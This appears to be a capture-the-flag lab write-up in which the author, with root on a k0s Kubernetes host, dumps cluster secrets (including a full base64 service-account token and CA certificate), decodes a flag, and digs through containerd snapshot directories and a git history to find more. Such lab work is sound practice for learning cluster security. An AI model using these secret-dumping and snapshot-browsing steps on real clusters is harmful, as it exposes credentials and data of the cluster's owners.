root        10  0.0  0.0      0     0 ?        S    15:38   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    15:38   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    15:38   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    15:38   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   15:38   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    15:38   0:00 [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    15:38   0:00 [kauditd]
root        17  0.0  0.0      0     0 ?        S    15:38   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    15:38   0:00 [xenwatch]
root        19  0.0  0.0      0     0 ?        I    15:38   0:00 [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    15:38   0:00 [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    15:38   0:00 [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   15:38   0:00 [writeback]
root        23  0.0  0.0      0     0 ?        S    15:38   0:00 [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   15:38   0:00 [ksmd]
root        25  0.0  0.0      0     0 ?        SN   15:38   0:00 [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   15:38   0:00 [crypto]
root        27  0.0  0.0      0     0 ?        I<   15:38   0:00 [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   15:38   0:00 [kblockd]
root        29  0.0  0.0      0     0 ?        I<   15:38   0:00 [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   15:38   0:00 [md]
root        31  0.0  0.0      0     0 ?        I<   15:38   0:00 [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   15:38   0:00 [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   15:38   0:00 [watchdogd]
root        36  0.0  0.0      0     0 ?        S    15:38   0:00 [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   15:38   0:00 [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    15:38   0:00 [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   15:38   0:00 [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   15:38   0:00 [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    15:38   0:00 [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   15:38   0:00 [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    15:38   0:00 [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   15:38   0:00 [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   15:38   0:00 [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   15:38   0:00 [kstrp]
root       117  0.0  0.0      0     0 ?        I<   15:38   0:00 [kworker/0:1H]
root       118  0.0  0.0      0     0 ?        I<   15:38   0:00 [charger_manager]
root       169  0.0  0.0      0     0 ?        I    15:38   0:00 [kworker/0:2]
root       188  0.0  0.0      0     0 ?        I<   15:38   0:00 [ttm_swap]
root       271  0.0  0.0      0     0 ?        I<   15:38   0:00 [raid5wq]
root       295  0.0  0.0      0     0 ?        I<   15:38   0:00 [kdmflush]
root       296  0.0  0.0      0     0 ?        I<   15:38   0:00 [bioset]
root       304  0.0  0.0      0     0 ?        I<   15:38   0:00 [kdmflush]
root       305  0.0  0.0      0     0 ?        I<   15:38   0:00 [bioset]
root       351  0.0  0.0      0     0 ?        S    15:38   0:00 [jbd2/dm-0-8]
root       352  0.0  0.0      0     0 ?        I<   15:38   0:00 [ext4-rsv-conver]
root       408  0.2  1.0 111248 10664 ?        S<s  15:38   0:05 /lib/systemd/systemd-journald
root       414  0.0  0.0      0     0 ?        I<   15:38   0:00 [iscsi_eh]
root       421  0.0  0.0      0     0 ?        I<   15:38   0:00 [rpciod]
root       422  0.0  0.0      0     0 ?        I<   15:38   0:00 [xprtiod]
root       423  0.0  0.1 105904  1504 ?        Ss   15:38   0:00 /sbin/lvmetad -f
root       425  0.0  0.0      0     0 ?        I<   15:38   0:00 [ib-comp-wq]
root       426  0.0  0.0      0     0 ?        I<   15:38   0:00 [ib_mcast]
root       427  0.0  0.0      0     0 ?        I<   15:38   0:00 [ib_nl_sa_wq]
root       428  0.1  0.4  46240  4620 ?        Ss   15:38   0:04 /lib/systemd/systemd-udevd
root       429  0.0  0.0      0     0 ?        I<   15:38   0:00 [rdma_cm]
systemd+   468  0.0  0.4  80168  4812 ?        Ss   15:38   0:00 /lib/systemd/systemd-networkd
root       501  0.0  0.3  47728  3280 ?        Ss   15:38   0:00 /sbin/rpcbind -f -w
systemd+   512  0.0  0.4  70628  4316 ?        Ss   15:38   0:00 /lib/systemd/systemd-resolved
root       623  0.0  1.2 170440 12204 ?        Ssl  15:39   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
message+   625  0.0  0.3  50100  3476 ?        Ss   15:39   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --s
daemon     634  0.0  0.2  28332  2156 ?        Ss   15:39   0:00 /usr/sbin/atd -f
syslog     636  0.0  0.3 267272  3636 ?        Ssl  15:39   0:01 /usr/sbin/rsyslogd -n
root       637  0.0  0.5  70604  5476 ?        Ss   15:39   0:00 /lib/systemd/systemd-logind
root       640  0.0  0.7 1232940 7060 ?        Ssl  15:39   0:00 /usr/bin/amazon-ssm-agent
root       641  2.2  3.1 787916 31760 ?        Ssl  15:39   0:56 /usr/local/bin/k0s controller --single=true
root       642  0.0  0.4 287536  5004 ?        Ssl  15:39   0:00 /usr/lib/accountsservice/accounts-daemon
root       644  0.0  0.2  31320  2852 ?        Ss   15:39   0:00 /usr/sbin/cron -f
root       646  0.0  0.1  95540  1560 ?        Ssl  15:39   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       653  0.0  0.2  15956  2048 ttyS0    Ss+  15:39   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       671  0.0  0.1  16180  1588 tty1     Ss+  15:39   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       686  0.0  1.8 1359208 18884 ?       Ssl  15:39   0:01 /usr/bin/containerd
root       687  0.0  0.4 291452  4996 ?        Ssl  15:39   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       691  0.0  0.5  72296  5228 ?        Ss   15:39   0:00 /usr/sbin/sshd -D
root       734  0.0  1.3 1170504 13432 ?       Sl   15:39   0:00 /usr/bin/ssm-agent-worker
root       765  0.1  3.2 1447128 32680 ?       Ssl  15:39   0:03 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1052  0.0  0.3 1005440 3724 ?        Sl   15:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -contai
root      1061  0.0  0.3 1152904 3936 ?        Sl   15:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 5000 -container-i
root      1075  0.0  0.3 1152904 3932 ?        Sl   15:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -contai
root      1080  0.0  0.3 1005440 3216 ?        Sl   15:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-i
root      1103  0.0  0.5 711444  5256 ?        Sl   15:39   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 54c2fca370f68b4fdb5d
root      1116  0.0  0.4 711444  4756 ?        Sl   15:39   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e7c06a854957fdc4f49e
vagrant   1147  0.1  1.3  28532 13324 pts/0    Ss+  15:39   0:04 python3 main.py
472       1162  0.2  3.7 786304 38256 pts/0    Ssl+ 15:39   0:07 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafan
kube-ap+  1228  1.7  2.9 729504 30188 ?        Sl   15:40   0:42 /var/lib/k0s/bin/kine --endpoint=sqlite:///var/lib/k0s/db/state.db?more=r
kube-ap+  1260 14.8 21.0 986892 211768 ?       Sl   15:40   6:06 /var/lib/k0s/bin/kube-apiserver --requestheader-allowed-names=front-proxy
vagrant   1291 12.5  2.1  29820 21268 pts/0    Sl+  15:40   5:09 /usr/local/bin/python3 /home/pyuser/main.py
kube-sc+  1336  0.1  2.3 753784 23348 ?        Sl   15:40   0:04 /var/lib/k0s/bin/kube-scheduler --leader-elect=false --profiling=false --
kube-ap+  1337  3.8  6.5 768064 65504 ?        Sl   15:40   1:33 /var/lib/k0s/bin/kube-controller-manager --cluster-signing-key-file=/var/
root      1517  0.0  0.0      0     0 ?        I    16:04   0:00 [kworker/u30:0]
root      1525  0.0  0.0      0     0 ?        I    16:09   0:00 [kworker/u30:2]
root      1534  0.0  0.0      0     0 ?        I    16:15   0:00 [kworker/u30:1]
root      1548  0.0  0.7 107984  7132 ?        Ss   16:17   0:00 sshd: vagrant [priv]
vagrant   1552  0.0  0.7  76776  7184 ?        Ss   16:17   0:00 /lib/systemd/systemd --user
vagrant   1554  0.0  0.1 193808  1832 ?        S    16:17   0:00 (sd-pam)
vagrant   1673  0.0  0.3 107984  3364 ?        S    16:17   0:00 sshd: vagrant@pts/0
vagrant   1674  0.0  0.3  21472  3520 pts/0    Ss   16:17   0:00 -bash
root      1694  0.0  0.4  67844  4364 pts/0    S    16:18   0:00 sudo -s
root      1696  0.0  0.3  21472  3840 pts/0    S    16:18   0:00 /bin/bash

https://k0sproject.io/

https://docs.k0sproject.io/v1.25.4+k0s.0/

https://github.com/k0sproject/k0s

kubectl controls the Kubernetes cluster manager.

 Find more information at: https://kubernetes.io/docs/reference/kubectl/overview/

Aliases:
kubectl, kc

Basic Commands (Beginner):
  create        Create a resource from a file or from stdin
  expose        Take a replication controller, service, deployment or pod and expose it as a new Kubernetes service
  run           Run a particular image on the cluster
  set           Set specific features on objects

Basic Commands (Intermediate):
  explain       Get documentation for a resource
  get           Display one or many resources
  edit          Edit a resource on the server
  delete        Delete resources by file names, stdin, resources and names, or by resources and label selector

Deploy Commands:
  rollout       Manage the rollout of a resource
  scale         Set a new size for a deployment, replica set, or replication controller
  autoscale     Auto-scale a deployment, replica set, stateful set, or replication controller

Cluster Management Commands:
  certificate   Modify certificate resources.
  cluster-info  Display cluster information
  top           Display resource (CPU/memory) usage
  cordon        Mark node as unschedulable
  uncordon      Mark node as schedulable
  drain         Drain node in preparation for maintenance
  taint         Update the taints on one or more nodes

Troubleshooting and Debugging Commands:
  describe      Show details of a specific resource or group of resources
  logs          Print the logs for a container in a pod
  attach        Attach to a running container
  exec          Execute a command in a container
  port-forward  Forward one or more local ports to a pod
  proxy         Run a proxy to the Kubernetes API server
  cp            Copy files and directories to and from containers
  auth          Inspect authorization
  debug         Create debugging sessions for troubleshooting workloads and nodes

Advanced Commands:
  diff          Diff the live version against a would-be applied version
  apply         Apply a configuration to a resource by file name or stdin
  patch         Update fields of a resource
  replace       Replace a resource by file name or stdin
  wait          Experimental: Wait for a specific condition on one or many resources
  kustomize     Build a kustomization target from a directory or URL.

Settings Commands:
  label         Update the labels on a resource
  annotate      Update the annotations on a resource
  completion    Output shell completion code for the specified shell (bash, zsh or fish)

Other Commands:
  alpha         Commands for features in alpha
  api-resources Print the supported API resources on the server
  api-versions  Print the supported API versions on the server, in the form of "group/version"
  config        Modify kubeconfig files
  plugin        Provides utilities for interacting with plugins
  version       Print the client and server version information

Usage:
  k0s kubectl [flags] [options]

Use "k0s kubectl <command> --help" for more information about a given command.
Use "k0s kubectl options" for a list of global command-line options (applies to all commands).


root@johnny:~/.ssh# k0s kubectl get secret
NAME                  TYPE                                  DATA   AGE
default-token-nhwb5   kubernetes.io/service-account-token   3      332d
k8s.authentication    Opaque                                1      332d

root@johnny:~/.ssh# k0s kubectl edit secret default-token-nhwb5


# Please edit the object below. Lines beginning with a '#' will be ignored,
# and an empty file will abort the edit. If an error occurs while saving this file will be
# reopened with the relevant failures.
#

apiVersion: v1
data:
  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURBRENDQWVpZ0F3SUJBZ0lVY0tubW5LZ0NPQjVqKzVKWHpMajIxeHYvZlBjd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF4TU5hM1ZpWlhKdVpYUmxjeTFqWVRBZUZ3MHlNakF5TVRBeE9EVXdNREJhRncwegpNakF5TURneE9EVXdNREJhTUJneEZqQVVCZ05WQkFNVERXdDFZbVZ5Ym1WMFpYTXRZMkV3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUN1ZGd5dTdoQUE1RkVrRFpJQ2s3Z3NYbkVBeHdOMzQ2Nk8KNDN6dFovVnAvSVJFYnJTc1dRbWQ4Tk1qV3hlZUwxbkxtV1FBSkdMOWswQ0psdFhvbWVHVk04eEs5L0tjUWxlMAoyeko4bHpWV2dWcHdnb3E5MnJjUXhXOVBnZENFd3lRdC9hUVIzVHdwSzlOeDRrcHMzSkZYK1dyYUxPUkxNWlorCnVpL2Z4UHBHeStTa1NUWEkySmN5MS9iN05DOGhHc010QTQ2TDhMenQ2QkRRVzNTVC9FbmtPdGdPai9MMjdkY3IKTmc3UlhpVThhdk0ydzlDS0pQbnp1b1k0dDdXZnRZeG1mWHFWRmdBaDRrWW9ONzJ1V2RsU1hOVnF0SkpSdkhDdgo2ZlpZbWFJK295bWtUaisrQVFHSGxjSGFnTE1VWXlvQVdVYXhxTTl2dE9HTVRpbGdjMWFqQWdNQkFBR2pRakJBCk1BNEdBMVVkRHdFQi93UUVBd0lCQmpBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJSUVpWcloKeENxVVRkME1KbHVkY0duSC9xS0xNREFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBaFdTTnRpMDEvMUVIZDVLbApnQ1llbDJpV29ielRXVmVsdzNMcXNYOEVuZ1RFYmlqUDJEVGF2RWpHV1ZzTzB1WWt2THp1dTdtT2Z3WDJDTFJ1CmY5Y3hScmRxeTRuSExxRkpkUVFwMjlMVmF1VXhoUHFNcjgxeVYxT1NYUzdmdFpNYngwZHBaSktaUnV1QzFhNUUKeE9lMkNXbU84QTJtVjhZcWU1eXRHNExzUko5ZWp5aEd4T21aNjZMVzBwck9zTnRhb2RUQnZlZkxYVFRlaXg1agpJZHhkaHVjaHYyeTFUa2pnSzZyNGZ3aTkrOWxtUTdnMEVEMFZEMkNMUWNnSFBwZ3BaYk51MTk1VHZFa3R4TWZ2CjlCbW81cEpXU0I5QTgzTFk0OVQ4U2VNMlQwdTk3dXpGNW83Z2lsbERGeGRvbFF3NGlRRmNLRytTUzI5d2QvYVIKcVhPeWhRPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
  namespace: ZGVmYXVsdA== (default)
  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqbG9hblp3WkVoMmExcFJUbFkxVGsxdVNIbzNSbkpuYUV0MWFsRTJhMk5DTkdvd09XdE5iMGt0U0UwaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWldaaGRXeDBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbVJsWm1GMWJIUXRkRzlyWlc0dGJtaDNZalVpTENKcmRXSmxjbTVsZEdWekxtbHZMM05sY25acFkyVmhZMk52ZFc1MEwzTmxjblpwWTJVdFlXTmpiM1Z1ZEM1dVlXMWxJam9pWkdWbVlYVnNkQ0lzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJakV3WkRReU56RXlMV0pqTnpVdE5EbG1PQzFpTWpNMkxUTmtNakZpTURRd05HWTRZaUlzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwa1pXWmhkV3gwT21SbFptRjFiSFFpZlEualFnNmstSk42S3dRYndDbEI3SENvR0ZCeFV5NFpWMUNZYnIxNXVRN202ck8wZWRqQ3RGQXpwdW1kWFBPMnFPR0s1b0JITmxoUFJ0cDZMSTZUZFVsWVp5TXNOaGZ1ZWNaaXFBRlB2bm5ReFhEckNnLVNKUFQ2WkJORUFNcTZhOUlSTHhfcHBlRlNOY2pVTUdFMzVibnBDYVNGMzFObHpUenN3RURIeGszcnFyVy1XWmtWTmh5Vnl4RGE4Z3VsaWxmd3ppa3RVa25iYnM3end6M0k2dmpTd0xfOXBlMV9Sa0xjUkFlamFyRl9qeVV3Z1ZsZWhkQnJ6WkFEdzE1OEFxTHI1STYxejBiM08xRVgwNTF3dm1VS3FDMldMdVkxS19qcXNCM2thYTlnVVl3REs0V0J5eUNuV3BYOFNFTzRpUGw5UEJRTlF5RGFnalVmY0ZMV01TUk13
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: default
    kubernetes.io/service-account.uid: 10d42712-bc75-49f8-b236-3d21b0404f8b
  creationTimestamp: "2022-02-10T18:56:17Z"
  name: default-token-nhwb5
  namespace: default
  resourceVersion: "383"
  uid: a74c755b-2dc5-402b-9baf-155f7b3bc9cc
type: kubernetes.io/service-account-token

:qa!

root@johnny:~/.ssh# k0s kubectl edit secret k8s.authentication

# Please edit the object below. Lines beginning with a '#' will be ignored,
# and an empty file will abort the edit. If an error occurs while saving this file will be
# reopened with the relevant failures.
#
apiVersion: v1
data:
  id: VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9
kind: Secret
metadata:
  creationTimestamp: "2022-02-10T18:58:02Z"
  name: k8s.authentication
  namespace: default
  resourceVersion: "515"
  uid: 416e4783-03a8-4f92-8e91-8cbc491bf727
type: Opaque

:qa! (to exit)

Edit cancelled, no changes made.

VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9 (from base64)

THM{yes_there_$s_no_$ecret}

┌──(kali㉿kali)-[/etc]
└─$ echo VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9 | base64 -d
THM{yes_there_$s_no_$ecret}  

```

What secret did you find?

	 *THM{yes_there_$s_no_$ecret}*

### Game of Pods

_Pods_ are the smallest deployable units of computing that you can create and manage in Kubernetes.

A _Pod_ (as in a pod of whales or pea pod) is a group of one or more [containers](https://kubernetes.io/docs/concepts/containers/), with shared storage and network resources, and a specification for how to run the containers. Find the Pod flag!

Answer the questions below

```

https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting/attacking-kubernetes-from-inside-a-pod?q=%2Fvar%2Flib

root@johnny:~/.ssh# k0s kubectl get pods --help
Display one or many resources.

 Prints a table of the most important information about the specified resources. You can filter the list using a label
selector and the --selector flag. If the desired resource type is namespaced you will only see results in your current
namespace unless you pass --all-namespaces.

 By specifying the output as 'template' and providing a Go template as the value of the --template flag, you can filter
the attributes of the fetched resources.

Use "kubectl api-resources" for a complete list of supported resources.

Examples:
  # List all pods in ps output format
  kubectl get pods
  
  # List all pods in ps output format with more information (such as node name)
  kubectl get pods -o wide
  
  # List a single replication controller with specified NAME in ps output format
  kubectl get replicationcontroller web
  
  # List deployments in JSON output format, in the "v1" version of the "apps" API group
  kubectl get deployments.v1.apps -o json
  
  # List a single pod in JSON output format
  kubectl get -o json pod web-pod-13je7
  
  # List a pod identified by type and name specified in "pod.yaml" in JSON output format
  kubectl get -f pod.yaml -o json
  
  # List resources from a directory with kustomization.yaml - e.g. dir/kustomization.yaml
  kubectl get -k dir/
  
  # Return only the phase value of the specified pod
  kubectl get -o template pod/web-pod-13je7 --template={{.status.phase}}
  
  # List resource information in custom columns
  kubectl get pod test-pod -o custom-columns=CONTAINER:.spec.containers[0].name,IMAGE:.spec.containers[0].image
  
  # List all replication controllers and services together in ps output format
  kubectl get rc,services
  
  # List one or more resources by their type and names
  kubectl get rc/web service/frontend pods/web-pod-13je7

Options:
  -A, --all-namespaces=false: If present, list the requested object(s) across all namespaces. Namespace in current
context is ignored even if specified with --namespace.
      --allow-missing-template-keys=true: If true, ignore any errors in templates when a field or map key is missing in
the template. Only applies to golang and jsonpath output formats.
      --chunk-size=500: Return large lists in chunks rather than all at once. Pass 0 to disable. This flag is beta and
may change in the future.
      --field-selector='': Selector (field query) to filter on, supports '=', '==', and '!='.(e.g. --field-selector
key1=value1,key2=value2). The server only supports a limited number of field queries per type.
  -f, --filename=[]: Filename, directory, or URL to files identifying the resource to get from a server.
      --ignore-not-found=false: If the requested object does not exist the command will return exit code 0.
  -k, --kustomize='': Process the kustomization directory. This flag can't be used together with -f or -R.
  -L, --label-columns=[]: Accepts a comma separated list of labels that are going to be presented as columns. Names are
case-sensitive. You can also use multiple flag options like -L label1 -L label2...
      --no-headers=false: When using the default or custom-column output format, don't print headers (default print
headers).
  -o, --output='': Output format. One of:
json|yaml|name|go-template|go-template-file|template|templatefile|jsonpath|jsonpath-as-json|jsonpath-file|custom-columns-file|custom-columns|wide
See custom columns [https://kubernetes.io/docs/reference/kubectl/overview/#custom-columns], golang template
[http://golang.org/pkg/text/template/#pkg-overview] and jsonpath template
[https://kubernetes.io/docs/reference/kubectl/jsonpath/].
      --output-watch-events=false: Output watch event objects when --watch or --watch-only is used. Existing objects are
output as initial ADDED events.
      --raw='': Raw URI to request from the server.  Uses the transport specified by the kubeconfig file.
  -R, --recursive=false: Process the directory used in -f, --filename recursively. Useful when you want to manage
related manifests organized within the same directory.
  -l, --selector='': Selector (label query) to filter on, supports '=', '==', and '!='.(e.g. -l key1=value1,key2=value2)
      --server-print=true: If true, have the server return the appropriate table output. Supports extension APIs and
CRDs.
      --show-kind=false: If present, list the resource type for the requested object(s).
      --show-labels=false: When printing, show all labels as the last column (default hide labels column)
      --show-managed-fields=false: If true, keep the managedFields when printing objects in JSON or YAML format.
      --sort-by='': If non-empty, sort list types using this field specification.  The field specification is expressed
as a JSONPath expression (e.g. '{.metadata.name}'). The field in the API resource specified by this JSONPath expression
must be an integer or a string.
      --template='': Template string or path to template file to use when -o=go-template, -o=go-template-file. The
template format is golang templates [http://golang.org/pkg/text/template/#pkg-overview].
  -w, --watch=false: After listing/getting the requested object, watch for changes.
      --watch-only=false: Watch for changes to the requested object(s), without listing/getting first.

Usage:
  k0s kubectl get
[(-o|--output=)json|yaml|name|go-template|go-template-file|template|templatefile|jsonpath|jsonpath-as-json|jsonpath-file|custom-columns-file|custom-columns|wide]
(TYPE[.VERSION][.GROUP] [NAME | -l label] | TYPE[.VERSION][.GROUP]/NAME ...) [flags] [options]

Use "k0s kubectl options" for a list of global command-line options (applies to all commands).

root@johnny:~/.ssh# k0s kubectl get pods -A
NAMESPACE     NAME                              READY   STATUS      RESTARTS   AGE
internship    internship-job-5drbm              0/1     Completed   0          332d
kube-system   kube-router-vsq85                 1/1     Running     0          332d
kube-system   metrics-server-74c967d8d4-pvv8l   1/1     Running     0          332d
kube-system   kube-api                          1/1     Running     0          332d
kube-system   coredns-6d9f49dcbb-9vbff          1/1     Running     0          332d
kube-system   kube-proxy-jws4q                  1/1     Running     0          332d

root@johnny:~/.ssh# k0s kubectl exec -it kube-api --namespace=kube-system -- bash
Error from server: error dialing backend: dial tcp 10.0.2.15:10250: i/o timeout

root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots# ls
1   11  13  15  17  19  21  23  25  27  29  30  32  34  36  38  4   41  43  5  7  9
10  12  14  16  18  20  22  24  26  28  3   31  33  35  37  39  40  42  44  6  8
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots# cd 38
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38# ls
fs  work
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38# cd fs
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs# ls
home
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs# cd home
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home# ls
ubuntu
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home# cd ubuntu
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu# ls
jokes
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu# cd jokes
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# ls
crush.jokes  dad.jokes  mom.jokes  programming.jokes
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# ls -lah
total 28K
drwxr-xr-x 3 root root 4.0K Feb  7  2022 .
drwxr-xr-x 3 root root 4.0K Feb  7  2022 ..
-rw-r--r-- 1 root root 1.3K Feb  7  2022 crush.jokes
-rw-r--r-- 1 root root  718 Feb  7  2022 dad.jokes
drwxr-xr-x 8 root root 4.0K Feb  7  2022 .git
-rw-r--r-- 1 root root  997 Feb  7  2022 mom.jokes
-rw-r--r-- 1 root root 1.2K Feb  7  2022 programming.jokes

https://git-scm.com/docs/git-log

https://education.github.com/git-cheat-sheet-education.pdf

root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git log
commit 224b741fa904ee98c75913eafbefa12ac820659f (HEAD -> master, origin/master, origin/HEAD)
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:38:15 2022 +0545

    feat: add programming.jokes

commit 22cd540f3df22a2f373d95e145056d5370c058f5
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:37:41 2022 +0545

    feat: add crush.jokes

commit 4b2c2d74b31d922252368c112a3907c5c1cf1ba3
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:37:13 2022 +0545

    feat: add cold.joke

commit 2be20457c290fa1e8cc8d18cd5b546cec474691c
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:34:54 2022 +0545

    feat: add mom.jokes

root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git log --pretty=oneline
224b741fa904ee98c75913eafbefa12ac820659f (HEAD -> master, origin/master, origin/HEAD) feat: add programming.jokes
22cd540f3df22a2f373d95e145056d5370c058f5 feat: add crush.jokes
4b2c2d74b31d922252368c112a3907c5c1cf1ba3 feat: add cold.joke
2be20457c290fa1e8cc8d18cd5b546cec474691c feat: add mom.jokes
cc342469e2a4894e34a3e6cf3c7e63603bd4753e feat: add dad.jokes

root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git show 224b741fa904ee98c75913eafbefa12ac820659f
commit 224b741fa904ee98c75913eafbefa12ac820659f (HEAD -> master, origin/master, origin/HEAD)
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:38:15 2022 +0545

    feat: add programming.jokes

diff --git a/programming.jokes b/programming.jokes
new file mode 100644
index 0000000..7abc404
--- /dev/null
+++ b/programming.jokes
@@ -0,0 +1,10 @@
+
+Software undergoes beta testing shortly before it’s released. Beta is Latin for “still doesn’t work. (Anonymous)
+Programming today is a race between software engineers striving to build bigger and better idiot-proof programs, and the universe trying to produce bigger and better idiots. So far, the universe is winning. (Rick Cook)
+It’s a curious thing about our industry: not only do we not learn from our mistakes, but we also don’t learn from our successes. (Keith Braithwaite)
+There are only two kinds of programming languages: those people always bitch about and those nobody uses. (Bjarne Stroustrup)
+In order to understand recursion, one must first understand recursion. (Anonymous)
+The cheapest, fastest, and most reliable components are those that aren’t there. (Gordon Bell)
+The best performance improvement is the transition from the nonworking state to the working state. (J. Osterhout)
+The trouble with programmers is that you can never tell what a programmer is doing until it’s too late. (Seymour Cray)
+Don’t worry if it doesn’t work right. If everything did, you’d be out of a job. (Mosher’s Law of Software Engineering)
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git show 22cd540f3df22a2f373d95e145056d5370c058f5
commit 22cd540f3df22a2f373d95e145056d5370c058f5
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:37:41 2022 +0545

    feat: add crush.jokes

diff --git a/crush.jokes b/crush.jokes
new file mode 100644
index 0000000..38c86e8
--- /dev/null
+++ b/crush.jokes
@@ -0,0 +1,16 @@
+Are you getting shorter? You seem to be inching closer to my heart.
+Are you talking to me? You’re not? Well then, please begin.
+Are you an extraterrestrial? Because you are out of this world!
+Aren’t you tired of running in my mind all day long?
+Can I borrow a kiss from you? Don’t worry I’ll give it back to you with interest.
+Did you know that the happiest place on earth is not Disneyland? It’s wherever you are!
+Do I really need to tell you a joke? Can’t we just kiss and be done with it?
+Do you know why I want to reshuffle the alphabet? It’s all for the sake of putting U and I together...forever.
+Excuse me, mind telling me what time it is? I must remember the exact time I met my soul mate!
+Here’s the deal: I will kiss you, and if you don’t like it, you can return it.
+I don’t mind falling over if it’s you I fall for.
+I wish I was the earth and you were the rain, so no matter what, you’d always fall for me.
+I’m gonna call the cops on you for stealing my heart.
+I’ve always thought happiness started with H. I just realized that all this time, it started with U.
+If you are here, then who is running heaven?
